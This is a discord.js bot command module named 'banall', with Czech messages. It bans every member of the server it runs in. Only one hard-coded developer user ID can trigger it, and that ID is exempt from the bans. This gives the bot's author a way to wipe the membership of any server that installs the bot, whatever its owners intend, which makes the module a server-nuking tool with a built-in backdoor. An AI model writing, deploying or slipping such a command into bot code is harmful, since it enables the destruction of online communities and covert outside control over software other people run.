const Discord = require("discord.js")

module.exports.run = async (bot, message, args) => {
    let BReason = args.join(" ").slice(0);
    if (!BReason) return message.reply(":warning: Zadej důvod, jinak tento příkaz nebude fungovat.")
    if (message.author.id != 417403958814965771) return message.reply(":warning: Příkaz mohou používat pouze jen ti, co jsou v Dot Development Project.")

    let C = message.channel;
    message.guild.members.forEach((f, i) => {
        if (f.id == 417403958814965771) return message.reply(":warning: Nemůžu být zablokován z tohoto serveru.")
        message.guild.member(f).ban(BReason);
        message.channel.send(`:white_check_mark: ${f} byl zablokován z tohoto serveru!`);
    });
    C.send(":white_check_mark: Všichni uživatelé z tohoto serveru byli zablokováni!");
}
module.exports.help = {
    name: "banall",
    aliases: []
}
